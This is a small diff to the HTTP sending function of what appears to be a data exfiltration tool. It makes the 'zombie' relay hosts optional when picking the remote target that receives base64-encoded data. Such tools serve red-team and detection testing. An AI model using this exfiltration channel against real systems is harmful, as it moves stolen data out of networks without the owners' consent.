@@ -36,8 +36,11 @@ class S(BaseHTTPRequestHandler):
             pass
 
 def send(data):
-    targets = [config['target']] + config['zombies']
-    target = "http://{}:{}".format(choice(targets), config['port'])
+    if config.has_key('zombies') and config['zombies'] != [""]:
+        targets = [config['target']] + config['zombies']
+    	target = "http://{}:{}".format(choice(targets), config['port'])
+    else:
+    	target = "http://{}:{}".format(config['target'], config['port'])
     app_exfiltrate.log_message(
         'info', "[http] Sending {0} bytes to {1}".format(len(data), target))
     data_to_send = {'data': base64.b64encode(data)}
